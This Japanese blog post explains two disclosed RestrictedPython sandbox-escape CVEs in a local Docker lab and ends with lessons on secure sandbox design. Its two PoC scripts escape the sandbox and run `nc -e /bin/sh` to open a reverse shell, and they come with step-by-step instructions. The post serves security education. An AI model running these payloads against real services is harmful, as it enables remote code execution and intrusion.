---
title: 言語Sandbox環境の脆弱性とその真因の考察 - RestrictedPythonを題材に
id: RestrictedPython-CVE
tags:
  - セキュリティ
  - Python
date: 2024-12-17 00:00:00
---

<img src="/img/2024/12-17/demo-capture.png" alt="CVE-2023-41039によるRevshell獲得のスクショ" width="auto" height="auto">

## ご挨拶

[Python Advent Calendar 2024](https://qiita.com/advent-calendar/2024/python) の17日目の記事です。

JTCでセキュリティ・プライバシー・データ基盤領域の研究開発をしている [@laysakura](https://x.com/laysakura) です。
この記事で扱うのは、信頼できないユーザーから与えられたコードを実行するための「言語Sandbox環境」です。特に、Pythonの言語Sandbox環境であるRestrictedPythonを取り上げます。

{% githubCard user:zopefoundation repo:RestrictedPython %}

言語Sandbox環境の理念は素晴らしく、応用先も色々と考えられるものですが、設計を誤ると攻撃者とのいたちごっこになってしまうということをこの記事を通してお伝えできればと思います。

それではお楽しみください（ここからは常体で失礼します）。

<!-- more -->

## 目次
<!-- toc -->

## 導入

「◯◯言語を安全に動作させる環境」のことを、言語Sandbox環境と呼ぶこととする。その言語が本来持つ、例えばファイルアクセスやコマンド呼び出しのような機能を「危険な機能」として使えないようにしたものが言語Sandbox環境の典型的な姿である。

Pythonの言語Sandbox環境として、RestrictedPythonというものがある。

{% githubCard user:zopefoundation repo:RestrictedPython %}

本稿では、RestrictedPythonを言語Sandbox環境の例として取り上げる。RestrictedPythonで報告されたCVEの詳説・デモを通じ、言語Sandbox環境に脆弱性をもたらす真因を考察する。

込み入った話も多いが、時間のない方は是非最後のTakeawayだけでも読んでいただくことを願う。

## 用語

- **Sandbox環境**
  - ホスト環境と隔離された環境。Sandbox環境で実行したプログラムは、Sandbox環境のみを環境（入力）とし、Sandbox環境にのみ影響を与えるのが理想とされる
- **Sandbox bypass**; Jailbreak
  - Sandbox環境で実行される悪意のあるプログラムにより、Sandbox環境外部（ホスト環境）と入出力すること
- **CVE** (Common Vulnerabilities and Exposures)
  - 個別製品の脆弱性に割り当てられる識別子
- **PoC** (Proof of Concept)
  - CVEの文脈では、CVEを突いた攻撃のコード
- **RCE** (Remote Code Execution)
  - 攻撃（脆弱性の悪用）カテゴリの一つ
  - 攻撃対象プロセスを実行するリモートマシンで、攻撃対象プロセスの実行ユーザーとして任意のコードを実行できるもの
    - 攻撃カテゴリの中で影響は最大レベル
- **Reverse-shell**
  - RCEを応用した典型的な攻撃。攻撃者がサーバーのシェルアクセスを得る
  - 通常のsshなどでは「クライアントからサーバーに接続し、サーバーのシェルを得る」方向だが、reverse-shellは逆に「サーバーからクライアントに接続し、サーバーのシェルをクライアントに明け渡す」方向
  - Reverse-shellの（攻撃者にとっての）利点:
    - RCEが成立していれば、サーバー側にさらなるポート開放を求めずに済む
    - サーバー側の侵入検知システム等ではincoming通信には厳しくoutbound通信には相対的に緩いことが多く、サーバーからのoutboundで成立する攻撃は成功率が比較的高い

## デモ環境セットアップ

RestrictedPython のCVEを再現するためのdockerイメージ（上述の「設定」も含む）を <https://github.com/laysakura/RestrictedPython-CVE-PoC> に用意した。

{% githubCard user:laysakura repo:RestrictedPython-CVE-PoC %}

### 構成図

<img src="/img/2024/12-17/demo-setup.svg" alt="デモ構成図" width="800px" height="auto">

各自の「ホストマシン」において、Dockerコンテナを立てる。「ホストマシン」がクライアント、Dockerコンテナがサーバーとなる。
サーバーのTCP 6000番ポートをホストマシンの6000番とマッピングしているため、 `localhost 6000` にてサーバーと通信できる。

### サーバー起動〜動作確認

**ホストマシンでのコマンド**

```console
# clone & cd
git clone https://github.com/laysakura/RestrictedPython-CVE-PoC.git
cd RestrictedPython-CVE-PoC

# Docker build
docker build -t restricted-python .

# Docker run
## インタラクティブモードでデフォルトCMD (bash) を起動
docker run -it -p 6000:6000 restricted-python
```

---

**コンテナ内でのコマンド**

```console
## Python実行サーバー起動
./run-server.sh
```

---

**ホストマシンでのコマンド**

```console
cd RestrictedPython-CVE-PoC

## フィボナッチ数列を計算するプログラムをサーバーに投入し、結果を得る
% nc localhost 6000 < ./example/fib.py
Hello from python sandbox server!
Your `run` function is executed by me with RestrictedPython, and you'll get the `return` value.
Enter Python code to execute:
Return value: 55
```

## RestrictedPythonの使い方・動作原理

### 使い方

[restricted_python_cve/run_server.py](https://github.com/laysakura/RestrictedPython-CVE-PoC/blob/main/restricted_python_cve/run_server.py) から、sandbox環境の設定を抜粋。

```python
def execute_restricted_code(code):
    """
    受け取ったコードをRestrictedPythonによりsandbox実行し、結果を返す

    Args:
        code (str): 実行するPythonコード。 `def run():` を含むこと

    Returns:
        any: run関数の実行結果
    """

    byte_code = compile_restricted(code, filename="<client code>", mode="exec")

    # byte_code 実行環境（sandbox環境）のグローバル関数・変数（以下、グローバル）を設定。
    #
    # グローバルなしだと、例えば `.` (`getattr`) も使えず、実行できるコードがあまりにも制約される。
    #
    # 一方でこの環境のグローバル関数・変数を引き継ぐと、それを通したsandbox-escapeに繋がるので、
    # RestrictedPython定義も借りて安全なグローバル関数・変数を設定する。
    #
    # なお、この辺の設定ベストプラクティスは公式ドキュメントを見てもわからないので、
    # UIUCTF23 の問題コードから拝借した: https://github.com/nikosChalk/ctf-writeups/blob/master/uiuctf23/pyjail/rattler-read/writeup/README.md#jail-analysis

    def no_import(name, *args, **kwargs):
        raise ImportError("Import is prohibited by the policy")

    policy_globals = {**safe_globals, **utility_builtins}
    policy_globals["__builtins__"]["__metaclass__"] = type
    policy_globals["__builtins__"]["__name__"] = type
    policy_globals["__builtins__"]["__import__"] = no_import
    policy_globals["_getattr_"] = Guards.safer_getattr
    policy_globals["_getiter_"] = Eval.default_guarded_getiter
    policy_globals["_getitem_"] = Eval.default_guarded_getitem
    policy_globals["_write_"] = Guards.full_write_guard
    policy_globals["_iter_unpack_sequence_"] = Guards.guarded_iter_unpack_sequence
    policy_globals["_unpack_sequence_"] = Guards.guarded_unpack_sequence
    policy_globals["enumerate"] = enumerate

    # 安全なglobalを設定した上で、byte_codeを実行。
    # 実行した結果としての関数定義は `my_locals` に格納する。
    my_locals = {}
    exec(byte_code, policy_globals, my_locals)
    print("Code executed successfully")

    if "run" not in my_locals:
        raise ValueError("No `run` function defined in the code")

    return my_locals["run"]()
```

### 動作原理

何が起きているかを解説する。適宜 [公式ドキュメント](https://restrictedpython.readthedocs.io/) も参照のこと。

1. `compile_restricted()` により、 `code` （クライアントから与えられたPythonプログラム文字列）をトランスパイル（コンパイルよりも単純な、プログラム文字列から別のプログラム文字列への変換）し、その後Pythonのバイトコードに変換
    - トランスパイルの内容:
        - 危険なメソッド呼び出しを、独自のメソッド呼び出しに変換（一例）:
            - `a.b` → `_getattr_(a, 'b')`
            - `getattr(a, 'b')` → `_getattr_(a, 'b')`
    - バイトコードというのは .pyc の中身と同じもの
2. バイトコードを実行する環境として、グローバル関数・変数（以下、グローバル）を設定
    - 例えば上述のトランスパイル結果の `_getattr_` について: `policy_globals["_getattr_"] = Guards.safer_getattr` の行により、Python標準の `getattr` ではなくRestrictedPythonの `safer_getattr` をグローバルに設定している
        - （設定なければ実行時に「`_getattr_` 関数が見つからない」ような旨のエラーとなる）
3. `exec` 関数（これはRestrictedPythonではなくPython標準の関数）に、バイトコードと上述の設定済みグローバルを与える
4. `exec` に設定した my_locals に、バイトコード実行の結果セットされたローカル関数・変数が格納される
    - それによりローカル関数としてセットされた `run()` 関数を実行（クライアントに `run()` 関数を書いてもらう制約あり）

#### 動作原理を動的に確認

**コンテナ内でのコマンド**

```console
# Python実行サーバー起動
./run-server.sh
```

---

**ホストマシンでのコマンド**

```console
# `open("/etc/passwd").read()` するプログラムをサーバーに投入し、結果を得ようとする
% nc localhost 6000 < ./example/open_to_info_leak.py
Hello from python sandbox server!
Your `run` function is executed by me with RestrictedPython, and you'll get the `return` value.
Enter Python code to execute:
Error executing the client code:
name 'open' is not defined
```

---

`open()` はPython標準のビルトイン関数であるが、 `policy_globals = {**safe_globals,**utility_builtins}` の行において `"open"` が `policy_globals` dictのキーにセットされないため、sandbox環境 ( `exec()` 内) におけるグローバルとして `open` は存在せずエラーとなっている。

## RestrictedPythonのCVE

RestrictedPythonに関する脆弱性は <https://github.com/zopefoundation/RestrictedPython/security> にて情報開示されている3つである。

そのうち Severity (重大度) が High である、下記2点について詳説する。

- [Arbitrary code execution via stack frame sandbox escape (CVE-2023-37271)](https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-wqc8-x2pr-7jqh)
- [Sandbox escape via various forms of "format". (CVE-2023-41039)](https://github.com/zopefoundation/RestrictedPython/security/advisories/GHSA-xjw2-6jm9-rf67)

この2つはどちらもRCE攻撃が可能である。

### CVE-2023-37271: ジェネレーターオブジェクトからスタックフレームを遡上することによるsandbox escape（筆者命名）

#### 原理

Pythonインタプリタはスタックフレームを持つ。例外等が発生した場合にも表示される。
スタックフレーム中の各要素は、その関数呼び出し時点での環境情報を内包する。環境情報にはグローバル空間のビルトイン関数なども含まれる。

Sandbox環境 ( `exec()` 内) のグローバル空間にはRCEに繋がるようなオブジェクトが存在しない場合を考える。
この前提で、**sandbox環境からスタックフレームを遡り、ホスト環境 ( `exec()` 呼び出し前) のグローバル空間を参照することで、RCEに繋がるオブジェクトへのアクセスを得る**というのが本脆弱性の核心である。

**Sandbox環境の中からスタックフレームを得る道筋を塞ぐのがRestrictedPython側の意図であったが、ジェネレーター関数から作成できるジェネレーターオブジェクトからはスタックフレームへの参照が生えていた**ため、そこが攻撃ベクトルとなった。

#### PoCコード

`example/cve_2023_37271.py` の中身を記載する。コメントを読み、上述の原理と照らし合わせてほしい。
Sandbox escapeが成功したあとは、ホストのグローバル環境のフレームから `import` ビルトイン関数を取得し、 `import os; os.system('任意コード')` 相当のことをしている。
「任意コード」部分は、dockerコンテナ内からホストへ通信するためのドメイン `host.docker.internal` を使って、ホストの9999番ポートにreverse-shellを張りに行っている。

```python
def run():
    # ジェネレーター関数
    def gen():
        yield 1

    # ジェネレーターオブジェクト作成
    g = gen()

    # スタックフレームを取得し、1個遡る
    g = (g.gi_frame.f_back for _ in [1])

    # 更に遡る（sandboxを超えてホストのフレームに至る）
    g = [f for f in g][0].f_back.f_back

    # ホストのフレームのビルトインから import を取得し、 `import os` 相当をする
    os_ = g.f_builtins["__import__"]("os")

    # os.system() で任意コード実行
    # ここではホストで待機しているreverse-shellに接続しに行く
    # ホスト側実行コマンド例
    #
    # ```bash
    # # Linux
    # nc -l -p 9999
    #
    # # MacOS
    # nc -nvl 9999
    # ```
    return os_.system("nc -e /bin/sh host.docker.internal 9999")
```

#### デモ動画とPoC実行手順

<iframe width="800" height="500" src="https://www.youtube.com/embed/JxJOSLlbG58?si=F-oklZwr-MaI9uH3" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

**コンテナ内でのコマンド**

```console
# Python実行サーバー起動（攻撃が再現するバージョンを指定）
./run-server.sh 6.0
```

---

**ホストマシンでのコマンド**

```console
# 別シェルで、reverse-shell待機
nc -l -p 9999  # MacOSだと nc -nvl 9999

# ---

cd dp-system-research/demo/RestrictedPython-CVE

# PoCコード投入
nc localhost 6000 < ./example/cve_2023_37271.py

# ---
# 先程の別シェルで、サーバーサイドのシェル操作ができるようになっている
% uname -a
Linux 6b9a20d3e2ad 6.6.22-linuxkit #1 SMP Fri Mar 29 12:21:27 UTC 2024 aarch64 GNU/Linux
```

### CVE-2023-41039: string.Formatter() の書式文字列内でのアトリビュートアクセスのサニタイズ漏れ（筆者命名）

#### 原理

**TL;DR**

- **`_` の付いたアトリビュートへのアクセス**、RestrictedPythonで禁止していたはずだが、 **`string.Formatter().format()` を使うことでバイパスできた**
  - → `random.Random.__init__` を経由し、 `os.system` にたどり着ける
- `os.system` を引数付きで呼び出すために、 `string.Formatter` を継承したクラスを作って一工夫

---

RestrictedPythonに与えるユーザーコードでは `a.b` のような直接的なアトリビュートアクセスや、 `_` から始まるアトリビュートアクセスが軒並み禁じられており、従ってsandbox escapeに繋がるようなコードが書きづらくなっている。

しかし、 **`string.Formatter().format()` を巧みに使うとこれをバイパス**できる。`string.Formatter().format("{0._someUnderscoredAttr_}", obj0)` は、 `str(obj0._someUnderscoredAttr_)` と同様の意味になる。後者のコードはRestrictedPythonで禁止されているが、前者は禁じられていない。

この挙動を利用し、**なんとか `os.system('reverse-shellコマンド')` を実行したい。**

os のオブジェクトさえ獲得できれば、 `string.Formatter().format("{0.system}", os)` とすることで `str(os.system)` までは至る。まずはここを目指す。

ユーザーコードの中では `random` モジュールが使える。これは `restricted_python_cve/run_server.py` の中で `policy_globals = {**safe_globals,**utility_builtins}` としているのが肝で、この `utility_builtins` の中に `random` モジュールが含まれているためである。

`random` モジュールのコードの中に、 `import os as _os` としている箇所がある。

<img src="/img/2024/12-17/random-import-os.png" alt="randomモジュールで import os している箇所" width="800px" height="auto">

従って、 `random` モジュール内から `_os` オブジェクトをたどることができる。具体的には:

```python
>>> string.Formatter().format("{0.Random.__init__.__globals__[_os]}", random)
"<module 'os' from '/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/os.py'>"
```

ここまでで `os` モジュールまで手に入れたので、あとは `os.system('cat /etc/passwd')` でも試したくなる。しかしここまでの方法では、 `system` 関数にアクセスはできても関数呼び出しができない。

```python
>>> string.Formatter().format("{0.Random.__init__.__globals__[_os].system}", random)
'<built-in function system>'

>>> string.Formatter().format("{0.Random.__init__.__globals__[_os].system('cat /etc/passwd')}", random)
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py", line 161, in format
    return self.vformat(format_string, args, kwargs)
  File "/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py", line 165, in vformat
    result, _ = self._vformat(format_string, args, kwargs, used_args, 2)
  File "/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py", line 205, in _vformat
    obj, arg_used = self.get_field(field_name, args, kwargs)
  File "/Users/sho.nakatani/.pyenv/versions/3.10.12/lib/python3.10/string.py", line 276, in get_field
    obj = getattr(obj, i)
AttributeError: module 'os' has no attribute 'system('cat /etc/passwd')'
```

そこで、 `string.Formatter` クラスを継承し、クラス内のメソッドを定義することで引数（ `'cat /etc/passwd'` ）付きの関数呼び出しを実現する。
`string.Formatter` の定義を以下に抜粋:

```python
class Formatter:
    # ...
    # given a field_name, find the object it references.
    #  field_name:   the field being looked up, e.g. "0.name"
    #                 or "lookup[3]"
    #  used_args:    a set of which args have been used
    #  args, kwargs: as passed in to vformat
    def get_field(self, field_name, args, kwargs):
        first, rest = _string.formatter_field_name_split(field_name)
        obj = self.get_value(first, args, kwargs)

        # loop through the rest of the field_name, doing
        #  getattr or getitem as needed
        for is_attr, i in rest:
            if is_attr:
                obj = getattr(obj, i)
            else:
                obj = obj[i]

        return obj, first
```

`obj` が、 `string.Formatter().format("{0.Random.__init__.__globals__[_os].system}", random)` における `system` となる。
ということで、継承したクラスでその `obj` を引数付きで呼び出せば目的達成。この方針で書いたコードが次のPoCとなる。

#### PoCコード

`example/cve_2023_41039.py` の中身を記載する。コメントを読み、上述の原理と照らし合わせてほしい。
`os.system` の呼び出しで行っているRCEによるReverse-shellは、上述の CVE-2023-37271 のPoCコードと全く同じ考えなので、そちらも参照。

```python
def run():

    # `string` は、ホスト側の `policy_globals = {**safe_globals, **utility_builtins}`
    # により使えるようになっている`
    class MyFormatter(string.Formatter):
        def get_field(self, field_name, args, kwargs):
            # sandbox内のグローバルには `super` がないので回りくどい呼び出しをする
            obj, first = string.Formatter.get_field(self, field_name, args, kwargs)

            # `string.Formatter.format("{0.Random.__init__.__globals__[_os].system}", random)
            # とした場合、最後の `system` 関数のオブジェクトが `obj` に入っている

            # `obj == os.system` を仮定し、 system() で任意コード実行
            # ここではホストで待機しているreverse-shellに接続しに行く
            # ホスト側実行コマンド例
            #
            # ```bash
            # # Linux
            # nc -l -p 9999
            #
            # # MacOS
            # nc -nvl 9999
            # ```
            obj("nc -e /bin/sh host.docker.internal 9999")

            return obj, first

    # `random` は、ホスト側の `policy_globals = {**safe_globals, **utility_builtins}`
    # により使えるようになっている`
    MyFormatter().format("{0.Random.__init__.__globals__[_os].system}", random)
```

#### デモ動画とPoC実行手順

<iframe width="800" height="500" src="https://www.youtube.com/embed/FApgqAJBNi0?si=ki4wwaxz40pxJPWu" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

---

**コンテナ内でのコマンド**

```console
# Python実行サーバー起動（攻撃が再現するバージョンを指定）
./run-server.sh 6.1
```

---

**ホストマシンでのコマンド**

```console
# 別シェルで、reverse-shell待機
nc -l -p 9999  # MacOSだと nc -nvl 9999

# ---
cd dp-system-research/demo/RestrictedPython-CVE

# PoCコード投入
nc localhost 6000 < ./example/cve_2023_41039.py

# ---
# 別シェルで、サーバーサイドのシェル操作ができるようになっている
uname -a
Linux 6b9a20d3e2ad 6.6.22-linuxkit #1 SMP Fri Mar 29 12:21:27 UTC 2024 aarch64 GNU/Linux
```

## Takeaway

### 何が起きていたか？

RestrictedPythoonの2つのCVEについて詳説し、RCEを悪用してReverse-shellを獲得するデモを提供した。

それぞれのCVEの原因を振り返る:

- CVE-2023-37271
  - **前提**: スタックフレームにアクセスされると、遡上してsandbox escapeできてしまう
  - **開発者の意図**: スタックフレームへのアクセスを**塞ぐ**
  - **攻撃の切り口**: ジェネレーターオブジェクトからスタックフレームにアクセスできた
- CVE-2023-41039
  - **前提**: **init** などの関数オブジェクトを辿れると os などの危険なビルトインモジュールにアクセスされてしまう
  - **開発者の意図**: _ で始まるアトリビュートへのアクセスを**塞ぐ**
  - **攻撃の切り口**: string.Formatter.format() の書式文字列を使って _ で始まるアトリビュートへアクセスできた

---

非常に大雑把に言うと、

- 防御側: **＜大事な資産＞** にアクセスされないように **＜資産への道筋＞** を塞ぐ
- 攻撃側: **＜大事な資産＞** にアクセスするため、塞がれていない別の **＜資産への道筋＞** を探す

という構図と言える。全ての脆弱性がこういう構図なわけではないにせよ、頻繁に見受けられる構図である。

### 更に歴史に学ぶ

RestrictedPythonよりも昔に、同じようにPythonのsandbox環境を志向したpysandboxというOSSがあった。

{% githubCard user:vstinner repo:pysandbox %}

そしてpysandboxは、[LWN.netの投稿](https://lwn.net/Articles/574215/) で総括されているように、 **「デザインから壊れていた」** ことを認めている。この投稿での指摘を抽出すると以下になる。

- **セキュリティ上の根本的な問題**
  - **Pythonの言語機能（特にintrospection）により、サンドボックスから脱出する方法が多数存在**する
  - CPythonの巨大なコードベース（126,000行以上）全体がセキュリティリスクとなる
  - 単一のバグでサンドボックス全体が破られる可能性がある
- 実用性の喪失
  - セキュリティ制限により、単純な計算以外ほぼ何もできなくなった
  - **多くの基本的な言語機能を削除せざるを得なかった**

### RestrictedPythonの脆弱性は出尽くしたか？

ここまでの議論を読めば、「まだ報告されてないだけで穴はあるはず」「攻撃者は1つでも穴を見つければ良い」という考えになるかと思う（筆者も同じ考え）。

攻撃者は時に「どうしてそんなの思いつくの...」と途方に暮れるような攻撃を考えるものである。Pythonのsandbox escapeのテクニックをまとめたページを紹介するので、是非ご一読いただきたい。

[Bypass Python sandboxes - HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)

### セキュアな言語Sandboxの作り方に関する総括

セキュリティを志向した言語Sandbox環境の作り方の大方針として、筆者の考えをまとめる。

- **[無理筋] 大きな言語機能の上に、小さなサブセットとしてsandboxを作る**
  - 大きな言語機能のたった一つでもsandbox escapeに使われたらアウト
  - しかも言語機能側は勝手に拡張されていくので追従は事実上不可
- **[進むべき道] 小さな言語機能（sandboxとして動作）の上に、大きな言語機能を乗せて利便を拡張**
